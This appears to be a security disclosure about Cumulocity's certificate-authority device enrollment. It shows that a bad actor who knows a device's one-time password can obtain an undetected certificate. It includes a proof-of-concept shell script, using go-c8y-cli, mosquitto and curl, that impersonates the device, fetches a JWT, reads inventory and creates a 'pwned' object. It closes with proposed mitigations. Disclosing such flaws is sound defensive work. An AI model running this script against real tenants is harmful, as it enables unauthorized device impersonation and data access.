## Scenario - Bad Actor discovers the one-time password and device id

The following describes a scenario where a bad actor gets hold of a device's one-time password used for device enrollment.

1. User A (legitimate user) registers a one-time password for a device
2. User B (bad actor), knows the device's one-time password and downloads the certificate but doesn't connect to Cumulocity
3. User A tries to register the real device, but the request fails. The user assumes that they just entered the wrong password, and register the one-time password again (or uses a new one-time password)
4. The device downloads the certificate via the simpleenroll endpoint using the one-time password, and then connects to the platform using an MQTT client

At this point,

* Only 1 certificate (the certificate issued to User A) appears in the device users provisioned certificates list
* User A is unaware of the security breach (i.e. that fact that User B also has a valid certificate)
* User A can not revoke the certificate issued to User B as there is no sign of the existence of the certificate

Later on,

1. User B (bad actor), uses the previously issued certificates to get a device token (JWT) via REST API `https://<domain>:8443/devicecontrol/deviceAccessToken`

After the bad actor has receive a token the following is problematic for User A to detect this situation:

* User A is unaware that there is another certificate being used to access and create data
* There is no record of the User B's device certificate in the platform: no audit entry, not on the device user object

### Example

Below is a script simulating this scenario. It uses go-c8y-cli which supports the device enrollment via the Cumulocity Certificate Authority feature, but any client using the interface could be exposed.

Note: The example uses an unreleased version of go-c8y-cli (https://github.com/reubenmiller/go-c8y-cli) from the main branch, so it is not publicly available. But please reach out if you wish to test the script out.

```sh
# connection details
C8Y_URL="thin-edge-io.eu-latest.cumulocity.com"
DEVICE_ID="rmi_demo00003"

# bad actor (knows the id and the one-time password)
c8y devices enroll --id "$DEVICE_ID" --host thin-edge-io.eu-latest.cumulocity.com --key "${DEVICE_ID}.fake.key" --cert "${DEVICE_ID}.fake.crt"

# real device client
c8y devices enroll --id "$DEVICE_ID" --host thin-edge-io.eu-latest.cumulocity.com --key "${DEVICE_ID}.key" --cert "${DEVICE_ID}.crt"

# real device publishes the registration message via MQTT
mosquitto_pub -i "$DEVICE_ID" \
    --key "${DEVICE_ID}.key" \
    --cert "${DEVICE_ID}.crt" \
    --cafile "$(brew --prefix)/etc/ca-certificates/cert.pem" \
    -h "$C8Y_URL" \
    -p 8883 \
    -t 's/us' \
    -m '100' \
    --debug

# real device subscribes to its topics
mosquitto_sub -i "$DEVICE_ID" \
    --key "${DEVICE_ID}.key" \
    --cert "${DEVICE_ID}.crt" \
    --cafile "$(brew --prefix)/etc/ca-certificates/cert.pem" \
    -h "$C8Y_URL" \
    -p 8883 \
    -t 's/ds' \
    --debug

# bad actor - fetch a client token via REST - https://cumulocity.com/docs/device-integration/device-integration-rest/#jwt-session-token-retrieval
TOKEN=$(curl -v --cert "${DEVICE_ID}.fake.crt" --key "${DEVICE_ID}.fake.key" \
   -H 'Accept: application/json' \
   -X POST \
   "https://$C8Y_URL:8443/devicecontrol/deviceAccessToken" | jq -r ".accessToken")

# bad actor - do requests against the platform
curl -v \
   -H "Accept: application/json" \
   -H "Authorization: Bearer $TOKEN" \
   "https://$C8Y_URL/inventory/managedObjects?pageSize=1"

# bad actor - create a new managed object
curl -v \
   -H "Accept: application/json" \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $TOKEN" \
   -X POST \
   --data-raw '{"name":"pwned","c8y_Global":{},"c8y_IsDevice":{}}' \
   "https://$C8Y_URL/inventory/managedObjects?pageSize=1"


# The bad actor can also connect via MQTT, but as soon as this is done, its certificate will appear in x509 provisioned certificates list
# thus potentially exposing the bad actor (but it would still be difficult for users to detect)
# bad actor connects via MQTT
mosquitto_sub -i "$DEVICE_ID" \
    --key "${DEVICE_ID}.fake.key" \
    --cert "${DEVICE_ID}.fake.crt" \
    --cafile "$(brew --prefix)/etc/ca-certificates/cert.pem" \
    -h "$C8Y_URL" \
    -p 8883 \
    -t 's/ds' \
    --debug
```

### Problems with this scenario

* Hard to detect this situation
    * bad actor can remain invisible for the lifespan of the certificate (up to 1 year). Though renewing the certificate might make it visible in the provisioned certificates list (I haven't checked this part yet)
    * no record in the audit log if the bad actor does not connect via MQTT

* Device permissions grant the bad actor access to a lot of data (though I'm pretty sure this is already known)
    * Create new managed objects (potentially uploading large binary files)
    * Read any managed objects, alarms, events, measurements and operations
    * Delete the existing managed objects owned by the device user

* Disrupt the MQTT connection of the real device
    * If the bad actor connects via MQTT, then it doesn't automatically kick any other MQTT client with the same ID. Clients will only be disconnected if they connect to the same Cumulocity Core, though only one client will receive the operations sent from Cumulocity


### Potential solutions

* Create an audit record when a certificate is issued by the Cumulocity CA (not just when the certificate is used to connect to the platform the first time)

* When a device is enrolled via the Cumulocity CA (e.g. simpleenroll endpoint), then any previously issued certificates should be revoked (but not when a device renews its certificate)

* In the UI Registration field, obfuscate the one-time password field, so the password is not visible by default (e.g. ***)



* Open questions
    * Should an audit record be created when a certificate is sent to a device and not just when the device uses it for the first time?

### Didier

* keep an audit log tracing all the certificates that have been signed by C8Y CA
* keep a trace that a certificate has been used to connect a client via MQTT or HTTP
* keep a trace that a certificate has been used to renew a certificate
* when a device is unrolled revoke any previous certificate for the same device id (but not when a device renew its certificate).
